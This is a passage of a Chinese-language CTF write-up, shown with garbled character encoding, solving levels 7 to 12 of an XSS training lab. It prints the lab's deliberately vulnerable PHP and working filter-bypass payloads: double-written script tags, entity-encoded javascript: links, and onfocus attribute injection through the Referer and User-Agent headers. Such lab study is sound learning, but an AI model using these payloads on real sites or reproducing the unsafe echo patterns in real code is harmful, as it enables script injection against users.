class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°é€šè¿‡ä¸‹åˆ’çº¿è¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ï¼Œä½†æ˜¯æ²¡æœ‰å¤§å°å†™è¿‡æ»¤</p>
<h1 id="level7ï¼ˆåŒå†™ï¼‰"><a href="#level7ï¼ˆåŒå†™ï¼‰" class="headerlink" title="level7ï¼ˆåŒå†™ï¼‰"></a>level7ï¼ˆåŒå†™ï¼‰</h1><p>åŒæ ·è¿›è¡Œå…³é”®å­—è¿‡æ»¤çš„å°è¯•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ONFocus &lt;SCRipt&gt; &lt;a href=javascript:alert()&gt;</span><br></pre></td></tr></table></figure>

<p>è¾“å…¥çš„è¯­å¥å˜æˆäº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">focus &lt;&gt; &lt;a =java:alert()&gt;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†on,script,hrefï¼Œå¹¶ä¸”è¿›è¡Œå°å†™è½¬åŒ–</p>
<p>å°è¯•ä½¿ç”¨åŒå†™ç»•è¿‡</p>
<p>payloadï¼ˆåŒå¼•å·é—­åˆï¼‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scrscriptipt&gt;alert()&lt;/scrscriptipt&gt;&lt;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191653816.png" alt="image-20250519165335765"><br>[O<br>è¿‡æ»¤åˆ é™¤äº†scriptä¹‹åå‰åçš„è¯­å¥æ‹¼æ¥æˆäº†æ–°çš„scriptæ ‡ç­¾</p>
<h1 id="level8ï¼ˆasciiè½¬unicodeç¼–ç æµè§ˆå™¨è‡ªåŠ¨è§£ç ï¼‰"><a href="#level8ï¼ˆasciiè½¬unicodeç¼–ç æµè§ˆå™¨è‡ªåŠ¨è§£ç ï¼‰" class="headerlink" title="level8ï¼ˆasciiè½¬unicodeç¼–ç æµè§ˆå™¨è‡ªåŠ¨è§£ç ï¼‰"></a>level8ï¼ˆasciiè½¬unicodeç¼–ç æµè§ˆå™¨è‡ªåŠ¨è§£ç ï¼‰</h1><p>æµ‹è¯•å­˜åœ¨ä»€ä¹ˆè¿‡æ»¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191659575.png" alt="image-20250519165919532"></p>
<p>å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„ä¸¤ä¸ªåœ°æ–¹è°ƒç”¨äº†ä¼ å…¥çš„å‚æ•°</p>
<p>å¯¹å…³é”®çš„æ ‡ç­¾éƒ½è¿›è¡Œäº†è¿‡æ»¤ï¼Œå­˜åœ¨å°å†™è½¬åŒ–å‡½æ•°</p>
<p>è¿˜æ·»åŠ äº†HTMLå®ä½“åŒ–ç¼–ç å°†åŒå¼•å·ç¼–ç äº†ï¼Œè¯´æ˜æ— æ³•æ·»åŠ æ–°çš„æ ‡ç­¾æ¥ç»•è¿‡å¯¹åº”çš„è¿‡æ»¤</p>
<p>è¿™é‡Œå¯ä»¥åˆ©ç”¨<strong>hrefçš„éšè—å±æ€§è‡ªåŠ¨è§£æHTMLå®ä½“åŒ–ç¼–ç ï¼ˆasciiè½¬unicodeï¼‰</strong></p>
<p>ç”±äºhrefæ ‡ç­¾è¿™é‡Œå¯ä»¥ç›´æ¥æ’å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert()è¿›è¡Œasciiè½¬Unicodeç¼–ç </span><br><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;</span><br></pre></td></tr></table></figure>

<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191707374.png" alt="image-20250519170729329"></p>
<p><strong>ä¸ºä»€ä¹ˆç›´æ¥è¿›è¡Œunicodeç¼–ç ç»•ä¸è¿‡ï¼Œè€Œè¿›è¡Œasciiè½¬unicodeç¼–ç å°±å¯ä»¥ç»•è¿‡ï¼Ÿ</strong></p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191713293.png" alt="image-20250519171340243"></p>
<p>æµè§ˆå™¨ <strong>ä¸ä¼šè‡ªåŠ¨è§£ç </strong> <code>\u0061</code> ç­‰ Unicode åºåˆ—ï¼Œç‚¹å‡»åæ— æ•ˆã€‚</p>
<p>æµè§ˆå™¨ <strong>ä¼šè‡ªåŠ¨è§£ç </strong> HTML å®ä½“ï¼Œè½¬æ¢ä¸ºçœŸå®å­—ç¬¦ã€‚</p>
<h1 id="level9ï¼ˆå†…è”æ³¨é‡Šç»•ifï¼‰"><a href="#level9ï¼ˆå†…è”æ³¨é‡Šç»•ifï¼‰" class="headerlink" title="level9ï¼ˆå†…è”æ³¨é‡Šç»•ifï¼‰"></a>level9ï¼ˆå†…è”æ³¨é‡Šç»•ifï¼‰</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;</span><br></pre></td></tr></table></figure>

<p>è¿›è¡ŒåŸºæœ¬çš„è¿‡æ»¤æµ‹è¯•</p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191723623.png" alt="image-20250519172354556"></p>
<p>hrefæ ‡ç­¾å¤„æ²¡æœ‰ä¼ å‚æˆåŠŸï¼Œå…¶ä»–è¿‡æ»¤äºä¸Šé¢ç›¸åŒ</p>
<p>æŸ¥çœ‹æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str7</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é™¤äº†åŸºæœ¬çš„è¿‡æ»¤ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªifè¯­å¥ï¼Œæ£€æµ‹æˆ‘ä»¬ä¼ å…¥çš„å­—ç¬¦ä¸²ä¸­æ˜¯å¦åŒ…å«http://ï¼Œä¸åŒ…å«çš„è¯å°±æ˜¯false==falseï¼Œæ‰§è¡Œifè¯­å¥ã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬åŒæ ·ä½¿ç”¨ä¸Šé¢çš„HTMLå®ä½“åŒ–ç¼–ç ç»•è¿‡ï¼ˆacsiiè½¬unicodeï¼‰ï¼Œä½†æ˜¯åœ¨åé¢æ·»åŠ ä¸€ä¸ªæ³¨é‡Šè¿‡çš„http://</p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/*http://*/</span><br></pre></td></tr></table></figure>

<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191729983.png" alt="image-20250519172907915"></p>
<h1 id="level10ï¼ˆéšè—æ ‡ç­¾hiddenæ ‡ç­¾è¦†ç›–ï¼‰"><a href="#level10ï¼ˆéšè—æ ‡ç­¾hiddenæ ‡ç­¾è¦†ç›–ï¼‰" class="headerlink" title="level10ï¼ˆéšè—æ ‡ç­¾hiddenæ ‡ç­¾è¦†ç›–ï¼‰"></a>level10ï¼ˆéšè—æ ‡ç­¾hiddenæ ‡ç­¾è¦†ç›–ï¼‰</h1><p>è§‚å¯Ÿç½‘é¡µæºç ï¼Œå‘ç°GETä¼ å‚çš„å€¼å€¼å‚¨å­˜åœ¨äº†h2æ ‡ç­¾ä¸­ã€‚</p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505200024700.png" alt="image-20250520002429581"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;</span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œè¿‡æ»¤æµ‹è¯•</p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505200026467.png" alt="image-20250520002632406"></p>
<p>å…¨éƒ¨çš„ç¬¦å·è¢«å®ä½“åŒ–äº†</p>
<p>æŸ¥çœ‹ç½‘é¡µçš„æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªéšè—çš„ä¼ å‚çš„å‚æ•°ï¼Œå‘ç°è¿‡æ»¤äº†<>ï¼Œä¸èƒ½å¤Ÿé—­åˆæ’å…¥æ ‡ç­¾æ¥ç»•è¿‡ï¼Œé‚£ä¹ˆè¿™é‡Œå¯ä»¥ä½¿ç”¨onfocusäº‹ä»¶ï¼Œä½†æ˜¯è¿™é‡Œçš„è¾“å…¥æ¡†è¢«éšè—äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=&quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·æ„é€ çš„ç»“æœå¦‚ä¸‹ï¼š<br><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505200053029.png" alt="image-20250520005332926"></p>
<p>ä½¿typeå±æ€§é—­åˆå¾—åˆ°type="text"è¦†ç›–äº†åé¢çš„type="hidden"</p>
<p>é¡µé¢å‡ºç°äº†è¾“å…¥æ¡†ï¼Œå¹¶ä¸”åœ¨å†æ¬¡ç‚¹å‡»ä¹‹åè§¦å‘äº†onfocusäº‹ä»¶</p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505200055331.png" alt="image-20250520005559280"></p>
<p><strong>æ³¨æ„ï¼šæ ¹æ®æºç çŒœè§£ä¼ å‚çš„å‚æ•°åï¼Œéšè—çš„inputæ ‡ç­¾å¯ä»¥æ’å…¥type="text"æ˜¾ç¤ºï¼Œä»è€Œè§¦å‘onfocusäº‹ä»¶</strong></p>
<h1 id="level11ï¼ˆrefererä¼ å€¼ï¼‰"><a href="#level11ï¼ˆrefererä¼ å€¼ï¼‰" class="headerlink" title="level11ï¼ˆrefererä¼ å€¼ï¼‰"></a>level11ï¼ˆrefererä¼ å€¼ï¼‰</h1><p>æ²¡æœ‰å‘ç°è¾“å…¥æ¡†ï¼Œç›´æ¥æŸ¥çœ‹ç½‘é¡µçš„æºç </p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505201459941.png" alt="image-20250520145856854"></p>
<p>å‘ç°ä¼¼ä¹æœ‰å››ä¸ª<input>æ ‡ç­¾ï¼Œä½†æ˜¯æ¯ä¸ªæ ‡ç­¾çš„è¾“å…¥æ¡†éƒ½è¢«éšè—äº†</p>
<p>è¿™é‡Œçš„å››ä¸ªå‚æ•°å€¼()éƒ½å¯ä»¥å°è¯•è¿›è¡Œä¼ å‚ ï¼Œä¼ å‚çš„æ–¹å¼ä¹Ÿä¸ç¡®å®š</p>
<p>ç»è¿‡å°è¯•GETä¼ å‚çš„å››ç§æ–¹å¼éƒ½è¡Œä¸é€š</p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505201516578.png" alt="image-20250520151626527"></p>
<p>ç»è¿‡æµ‹è¯•åœ¨ä½¿ç”¨æœ€åä¸€ä¸ªå‚æ•°POSTä¼ å‚çš„æ—¶å€™</p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505201517865.png" alt="image-20250520151751828"></p>
<p>å‘ç°ä¼ å‚çš„å€¼æˆåŠŸæ’å…¥</p>
<p>ä¼ å…¥payloadè¿›è¡Œè¿‡æ»¤æµ‹è¯•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505201519208.png" alt="image-20250520151906176"></p>
<p>å‡ºç°äº†ä¼ å…¥çš„urlï¼Œä½†æ˜¯ä¾æ—§çœ‹ä¸åˆ°ä¼ å…¥çš„å†…å®¹</p>
<p>å¥½å§è¿™é‡Œçš„è§£é‡Šæ˜¯çœ‹è¿™ä¸ªå‚æ•°çš„åå­—è”æƒ³åˆ°httpå¤´refererçš„å‚æ•°(t_ref)</p>
<p>é‚£ä¹ˆå°±æŠ“åŒ…è¿›åœ¨è¯·æ±‚åŒ…ä¸­æ·»åŠ refererå‚æ•°</p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505201534140.png" alt="image-20250520153410102"></p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505201533385.png" alt="image-20250520153338343"></p>
<p>å‘ç°å¤§å°äºç¬¦å·éƒ½è¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆå°±å°è¯•ä½¿ç”¨onfocusäº‹ä»¶ç»•è¿‡</p>
<p>æ„é€ payload(åŒå¼•å·é—­åˆ)ï¼Œè¿˜è¦æ³¨æ„è¦†ç›–åé¢çš„type="hidden"</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=&quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure>

<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505202047225.png" alt="image-20250520204736190"></p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505202046614.png" alt="image-20250520204656557"></p>
<p>æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå­˜åœ¨éšè—çš„GETä¼ å‚çš„å‚æ•°t_sortï¼Œä½†æ˜¯åˆå®ä¾‹åŒ–å‡½æ•°å°±é—­åˆä¸äº†åé¢çš„hiddenæ ‡ç­¾</p>
<p><strong>æ³¨æ„ï¼š</strong></p>
<p>æ³¨æ„æ˜¯å¦å­˜åœ¨httpçš„è¯·æ±‚å¤´ä¼ å€¼</p>
<h1 id="level12ï¼ˆuser-agentä¼ å€¼ï¼‰"><a href="#level12ï¼ˆuser-agentä¼ å€¼ï¼‰" class="headerlink" title="level12ï¼ˆuser-agentä¼ å€¼ï¼‰"></a>level12ï¼ˆuser-agentä¼ å€¼ï¼‰</h1><p>æŸ¥çœ‹ç½‘é¡µçš„æºç </p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505202109661.png" alt="image-20250520210927612"></p>
<p>çœ‹æœ€åä¸€ä¸ªæ ‡ç­¾ä¸­çš„valueå€¼å¯ä»¥çœ‹åˆ°æ˜¯User-Agentå¤´</p>
<p>ä¸ä¸Šé¢ç›¸åŒçš„æ“ä½œç›¸åŒï¼ŒæŠ“åŒ…æ·»åŠ user-agentå¤´</p>
<p>å…ˆæµ‹è¯•è¿‡æ»¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</span><br></pre></td></tr></table></figure>

<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505202117112.png" alt="image-20250520211744068"></p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505202118919.png" alt="image-20250520211823878"></p>
<p>å‘ç°å­˜åœ¨å¤§å†™è½¬å°å†™çš„å‡½æ•°ï¼Œè¿‡æ»¤äº†å¤§äºå°äºç¬¦å·</p>
<p>æ„é€ payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure>

<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505202127896.png" alt="image-20250520212739853"></p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505202127769.png" alt="image-20250520212715704"></p>
<p><strong>æ³¨æ„ï¼š</strong></p>
<p>è·Ÿä¸Šé¢˜ä¸€æ ·ï¼Œè€ƒè™‘ä¸€ä¸‹httpå¤´ä¼ å€¼ï¼Œè¿™æ¬¡çš„User-Agentä¼ å€¼</p>
<h1 id="level13ï¼ˆcookieä¼ å€¼-å¯åœ¨ç½‘é¡µè¿›è¡Œï¼‰"><a href="#level13ï¼ˆcookieä¼ å€¼-å¯åœ¨ç½‘é¡µè¿›è¡Œï¼‰" class="headerlink" title="level13ï¼ˆcookieä¼ å€¼ å¯åœ¨ç½‘é¡µè¿›è¡Œï¼‰"></a>level13ï¼ˆcookieä¼ å€¼ å¯åœ¨ç½‘é¡µè¿›è¡Œï¼‰</h1><p>æ²¡æœ‰è¾“å…¥æ¡†æŸ¥çœ‹ç½‘é¡µçš„æºç </p>
